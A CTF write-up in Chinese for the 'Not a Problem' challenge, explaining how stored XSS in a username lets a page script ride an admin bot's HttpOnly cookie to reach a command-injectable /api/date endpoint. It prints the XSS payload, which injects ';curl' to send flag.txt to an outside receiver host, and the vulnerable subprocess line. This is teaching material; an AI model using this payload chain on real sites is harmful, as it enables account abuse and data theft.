# Not a Problem

## 题目简述

应用允许提交用户名和分数，再从 `/api/stats/<id>` 返回 Python 列表的字符串表示。用户名未转义，响应作为 HTML 解释，形成存储型 XSS。管理员机器人携带 HttpOnly `secret` Cookie；受保护的 `/api/date` 又把 `modifier` 拼入 shell 命令，形成命令注入。

## 解题过程

先把 XSS 载荷作为用户名提交：

```html
<script>
fetch('/api/date?modifier=;curl https://receiver.example/?$(cat flag.txt)')
</script>
```

```python
r = requests.post(base + "/api/stats", json={
    "username": payload,
    "high_score": 0,
})
stat_id = r.json()["id"]
```

响应形如 `['<script>...</script>', 0]`，但其中的 script 标签仍会在 HTML 文档里执行。把 `api/stats/<uuid>` 交给管理员机器人。机器人只检查提交 URL 是否包含字符串 `date` 或 `%`；这个无害路径两者都不含，而真正的 `/api/date` 请求由页面加载后的脚本发起。

管理员的 HttpOnly Cookie 不能被 JavaScript 读取，却会自动随同源 `fetch` 发送，因而通过鉴权。服务随后执行：

```python
subprocess.getoutput("date " + modifier)
```

分号启动 `curl` 并外带 `flag.txt`，得到：

```text
byuctf{"not_a_problem"_YEAH_RIGHT}
```

## 方法总结

HttpOnly 只防止脚本直接读取 Cookie，不阻止携带 Cookie 发起请求。完整利用链是存储型 XSS → 借管理员身份访问受限端点 → shell 命令注入；URL 黑名单只检查初始导航，无法约束页面内的后续请求。
